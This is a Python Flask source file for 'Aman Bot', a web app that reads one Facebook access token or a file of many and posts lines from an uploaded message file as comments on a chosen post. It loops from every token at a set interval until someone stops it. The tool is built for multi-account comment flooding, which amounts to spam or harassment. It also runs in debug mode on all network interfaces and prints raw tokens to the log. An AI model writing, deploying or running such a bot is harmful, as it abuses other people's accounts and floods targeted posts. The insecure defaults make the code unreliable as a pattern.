from flask import Flask, request, render_template_string, redirect, url_for
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}


def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v21.0/{thread_id}/comments?access_token={access_token}'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Sent Failed From token {access_token}: {message}")
                time.sleep(time_interval)


@app.route('/', methods=['GET', 'POST'])
def send_message():
    task_id = request.args.get('taskId', '')
    
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return redirect(url_for('send_message', taskId=task_id))

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Aman - Facebook Comment Bot</title>
        <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiByeD0iNCIgZmlsbD0iIzAwMDAwMCIvPgo8cmVjdCB4PSI4IiB5PSI4IiB3aWR0aD0iMTYiIGhlaWdodD0iNCIgZmlsbD0iIzAwZDRmZiIvPgo8cmVjdCB4PSIxNCIgeT0iMTIiIHdpZHRoPSI0IiBoZWlnaHQ9IjE2IiBmaWxsPSIjMDBkNGZmIi8+Cjwvc3ZnPg==">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <style>
            :root {
                --primary: #4361ee;
                --secondary: #3a0ca3;
                --accent: #4cc9f0;
                --dark: #1a1a2e;
                --darker: #16213e;
                --light: #f8f9fa;
                --success: #4ade80;
                --danger: #f72585;
            }
            
            * {
                font-family: 'Poppins', sans-serif;
            }
            
            body {
                background: linear-gradient(135deg, var(--dark) 0%, var(--darker) 100%);
                color: var(--light);
                min-height: 100vh;
                background-attachment: fixed;
            }
            
            .glass-card {
                background: rgba(255, 255, 255, 0.08);
                backdrop-filter: blur(10px);
                border-radius: 16px;
                border: 1px solid rgba(255, 255, 255, 0.1);
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                overflow: hidden;
            }
            
            .header {
                background: linear-gradient(90deg, var(--primary) 0%, var(--secondary) 100%);
                padding: 20px 0;
                border-radius: 0 0 20px 20px;
                box-shadow: 0 4px 20px rgba(67, 97, 238, 0.3);
                margin-bottom: 30px;
            }
            
            .logo {
                font-weight: 700;
                font-size: 2.2rem;
                background: linear-gradient(90deg, #fff 0%, var(--accent) 100%);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                display: inline-block;
            }
            
            .tagline {
                font-size: 1rem;
                opacity: 0.8;
                margin-top: -5px;
            }
            
            .form-control {
                background: rgba(255, 255, 255, 0.1);
                border: 1px solid rgba(255, 255, 255, 0.2);
                color: var(--light);
                border-radius: 10px;
                padding: 12px 15px;
                transition: all 0.3s;
            }
            
            .form-control:focus {
                background: rgba(255, 255, 255, 0.15);
                border-color: var(--accent);
                color: var(--light);
                box-shadow: 0 0 0 0.25rem rgba(76, 201, 240, 0.25);
            }
            
            .form-label {
                font-weight: 500;
                margin-bottom: 8px;
                color: var(--accent);
            }
            
            .btn-primary {
                background: linear-gradient(90deg, var(--primary) 0%, var(--secondary) 100%);
                border: none;
                border-radius: 10px;
                padding: 12px 20px;
                font-weight: 600;
                transition: all 0.3s;
            }
            
            .btn-primary:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(67, 97, 238, 0.4);
            }
            
            .btn-danger {
                background: linear-gradient(90deg, var(--danger) 0%, #b5179e 100%);
                border: none;
                border-radius: 10px;
                padding: 12px 20px;
                font-weight: 600;
                transition: all 0.3s;
            }
            
            .btn-danger:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(247, 37, 133, 0.4);
            }
            
            .feature-icon {
                width: 50px;
                height: 50px;
                background: rgba(76, 201, 240, 0.2);
                border-radius: 12px;
                display: flex;
                align-items: center;
                justify-content: center;
                margin-right: 15px;
                color: var(--accent);
                font-size: 1.5rem;
            }
            
            .feature-card {
                padding: 20px;
                border-radius: 12px;
                background: rgba(255, 255, 255, 0.05);
                transition: all 0.3s;
                height: 100%;
            }
            
            .feature-card:hover {
                transform: translateY(-5px);
                background: rgba(255, 255, 255, 0.08);
            }
            
            .footer {
                margin-top: 50px;
                padding: 20px 0;
                border-top: 1px solid rgba(255, 255, 255, 0.1);
            }
            
            .social-links a {
                color: var(--light);
                font-size: 1.2rem;
                margin: 0 10px;
                transition: all 0.3s;
            }
            
            .social-links a:hover {
                color: var(--accent);
                transform: translateY(-3px);
            }
            
            .status-indicator {
                display: inline-block;
                width: 10px;
                height: 10px;
                border-radius: 50%;
                background: var(--success);
                margin-right: 8px;
                animation: pulse 2s infinite;
            }
            
            @keyframes pulse {
                0% { opacity: 1; }
                50% { opacity: 0.5; }
                100% { opacity: 1; }
            }
            
            .file-upload-area {
                border: 2px dashed rgba(255, 255, 255, 0.2);
                border-radius: 10px;
                padding: 20px;
                text-align: center;
                transition: all 0.3s;
                cursor: pointer;
            }
            
            .file-upload-area:hover {
                border-color: var(--accent);
                background: rgba(76, 201, 240, 0.05);
            }
            
            .task-id-display {
                background: rgba(76, 201, 240, 0.1);
                border-radius: 10px;
                padding: 15px;
                margin-top: 20px;
                border-left: 4px solid var(--accent);
            }
            
            .stats-card {
                text-align: center;
                padding: 20px;
                border-radius: 12px;
                background: rgba(255, 255, 255, 0.05);
            }
            
            .stats-number {
                font-size: 2rem;
                font-weight: 700;
                color: var(--accent);
            }
            
            .stats-label {
                font-size: 0.9rem;
                opacity: 0.8;
            }
        </style>
    </head>
    <body>
        <div class="header text-center">
            <div class="container">
                <h1 class="logo">AMAN BOT</h1>
                <p class="tagline">Facebook Comment Automation Tool</p>
            </div>
        </div>
        
        <div class="container">
            <div class="row">
                <div class="col-lg-8 mx-auto">
                    <div class="glass-card p-4 p-md-5 mb-5">
                        <h3 class="text-center mb-4" style="color: var(--accent);">Comment Bot Configuration</h3>
                        
                        <form method="post" enctype="multipart/form-data">
                            <div class="mb-4">
                                <label for="tokenOption" class="form-label">Token Option</label>
                                <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
                                    <option value="single">Single Token</option>
                                    <option value="multiple">Multiple Tokens (File)</option>
                                </select>
                            </div>
                            
                            <div class="mb-4" id="singleTokenInput">
                                <label for="singleToken" class="form-label">Facebook Access Token</label>
                                <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="EAAGNOB0b0PcBOZCb7QN3c1bZC...">
                            </div>
                            
                            <div class="mb-4" id="tokenFileInput" style="display: none;">
                                <label for="tokenFile" class="form-label">Upload Token File</label>
                                <div class="file-upload-area" onclick="document.getElementById('tokenFile').click()">
                                    <i class="fas fa-cloud-upload-alt mb-2" style="font-size: 2rem; opacity: 0.7;"></i>
                                    <p class="mb-0">Click to upload tokens.txt file</p>
                                    <small class="text-muted">One token per line</small>
                                    <input type="file" class="d-none" id="tokenFile" name="tokenFile" accept=".txt">
                                </div>
                            </div>
                            
                            <div class="row">
                                <div class="col-md-6 mb-4">
                                    <label for="threadId" class="form-label">Post ID</label>
                                    <input type="text" class="form-control" id="threadId" name="threadId" placeholder="100023430452145_1613481659442834" required>
                                </div>
                                
                                <div class="col-md-6 mb-4">
                                    <label for="kidx" class="form-label">Your Name</label>
                                    <input type="text" class="form-control" id="kidx" name="kidx" placeholder="Enter your name" required>
                                </div>
                            </div>
                            
                            <div class="row">
                                <div class="col-md-6 mb-4">
                                    <label for="time" class="form-label">Time Interval (Seconds)</label>
                                    <input type="number" class="form-control" id="time" name="time" min="1" value="5" required>
                                </div>
                                
                                <div class="col-md-6 mb-4">
                                    <label for="txtFile" class="form-label">Message File</label>
                                    <div class="file-upload-area" onclick="document.getElementById('txtFile').click()">
                                        <i class="fas fa-file-alt mb-2" style="font-size: 2rem; opacity: 0.7;"></i>
                                        <p class="mb-0">Click to upload messages.txt</p>
                                        <small class="text-muted">One message per line</small>
                                        <input type="file" class="d-none" id="txtFile" name="txtFile" accept=".txt" required>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="d-grid gap-2">
                                <button type="submit" class="btn btn-primary btn-lg">
                                    <i class="fas fa-play-circle me-2"></i> Start Comment Bot
                                </button>
                            </div>
                        </form>
                        
                        {% if task_id %}
                        <div class="task-id-display mt-4">
                            <h5 class="d-flex align-items-center">
                                <span class="status-indicator"></span>
                                Task Running
                            </h5>
                            <p class="mb-1">Task ID: <strong>{{ task_id }}</strong></p>
                            <small>Use this ID to stop the task</small>
                        </div>
                        {% endif %}
                    </div>
                    
                    <div class="glass-card p-4 mb-5">
                        <h4 class="mb-4" style="color: var(--accent);">Stop Running Task</h4>
                        <form method="post" action="/stop">
                            <div class="row">
                                <div class="col-md-8">
                                    <input type="text" class="form-control" id="taskId" name="taskId" placeholder="Enter Task ID to stop" required>
                                </div>
                                <div class="col-md-4">
                                    <button type="submit" class="btn btn-danger w-100">
                                        <i class="fas fa-stop-circle me-2"></i> Stop Task
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>
                    
                    <div class="row mb-5">
                        <div class="col-md-4 mb-3">
                            <div class="stats-card">
                                <div class="stats-number" id="tasksRunning">{{ threads|length }}</div>
                                <div class="stats-label">Active Tasks</div>
                            </div>
                        </div>
                        <div class="col-md-4 mb-3">
                            <div class="stats-card">
                                <div class="stats-number" id="totalComments">0</div>
                                <div class="stats-label">Comments Sent</div>
                            </div>
                        </div>
                        <div class="col-md-4 mb-3">
                            <div class="stats-card">
                                <div class="stats-number" id="successRate">100%</div>
                                <div class="stats-label">Success Rate</div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="row">
                        <div class="col-md-6 mb-4">
                            <div class="feature-card">
                                <div class="d-flex align-items-center mb-3">
                                    <div class="feature-icon">
                                        <i class="fas fa-bolt"></i>
                                    </div>
                                    <h5 class="mb-0">Fast Performance</h5>
                                </div>
                                <p class="mb-0">High-speed comment automation with configurable intervals between posts.</p>
                            </div>
                        </div>
                        <div class="col-md-6 mb-4">
                            <div class="feature-card">
                                <div class="d-flex align-items-center mb-3">
                                    <div class="feature-icon">
                                        <i class="fas fa-shield-alt"></i>
                                    </div>
                                    <h5 class="mb-0">Secure</h5>
                                </div>
                                <p class="mb-0">Your tokens and data are processed securely without storing any information.</p>
                            </div>
                        </div>
                        <div class="col-md-6 mb-4">
                            <div class="feature-card">
                                <div class="d-flex align-items-center mb-3">
                                    <div class="feature-icon">
                                        <i class="fas fa-users"></i>
                                    </div>
                                    <h5 class="mb-0">Multi-Account</h5>
                                </div>
                                <p class="mb-0">Support for multiple accounts with token files for larger operations.</p>
                            </div>
                        </div>
                        <div class="col-md-6 mb-4">
                            <div class="feature-card">
                                <div class="d-flex align-items-center mb-3">
                                    <div class="feature-icon">
                                        <i class="fas fa-sliders-h"></i>
                                    </div>
                                    <h5 class="mb-0">Customizable</h5>
                                </div>
                                <p class="mb-0">Fully customizable messages and timing to suit your specific needs.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <footer class="footer text-center">
            <div class="container">
                <div class="social-links mb-3">
                    <a href="https://www.facebook.com/MISTER.T0M" target="_blank">
                        <i class="fab fa-facebook"></i>
                    </a>
                    <a href="https://wa.me/+5678953332" target="_blank">
                        <i class="fab fa-whatsapp"></i>
                    </a>
                    <a href="#">
                        <i class="fab fa-telegram"></i>
                    </a>
                    <a href="#">
                        <i class="fab fa-github"></i>
                    </a>
                </div>
                <p class="mb-0">&copy; 2023 Aman Bot. All rights reserved.</p>
                <small class="text-muted">Use responsibly and in compliance with Facebook's Terms of Service.</small>
            </div>
        </footer>

        <script>
            function toggleTokenInput() {
                var tokenOption = document.getElementById('tokenOption').value;
                if (tokenOption == 'single') {
                    document.getElementById('singleTokenInput').style.display = 'block';
                    document.getElementById('tokenFileInput').style.display = 'none';
                } else {
                    document.getElementById('singleTokenInput').style.display = 'none';
                    document.getElementById('tokenFileInput').style.display = 'block';
                }
            }
            
            // File upload display
            document.getElementById('tokenFile').addEventListener('change', function(e) {
                if (this.files.length > 0) {
                    document.querySelector('#tokenFileInput .file-upload-area p').textContent = this.files[0].name;
                }
            });
            
            document.getElementById('txtFile').addEventListener('change', function(e) {
                if (this.files.length > 0) {
                    document.querySelector('#txtFileInput .file-upload-area p').textContent = this.files[0].name;
                }
            });
            
            // Update stats (this would typically come from the backend)
            function updateStats() {
                // This would be updated via AJAX in a real application
                // For now, we'll just use the initial values
            }
            
            // Initialize
            document.addEventListener('DOMContentLoaded', function() {
                toggleTokenInput();
                updateStats();
                
                // Auto-fill sample data for testing (remove in production)
                document.getElementById('threadId').value = '100023430452145_1613481659442834';
                document.getElementById('kidx').value = 'Aman';
                document.getElementById('singleToken').value = 'EAAGNOB0b0PcBOZCb7QN3c1bZC...';
            });
        </script>
    </body>
    </html>
    ''', task_id=task_id, threads=threads)


@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        threads.pop(task_id, None)
        return f'Task with ID {task_id} has been stopped successfully.'
    else:
        return f'No task found with ID {task_id}.'


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
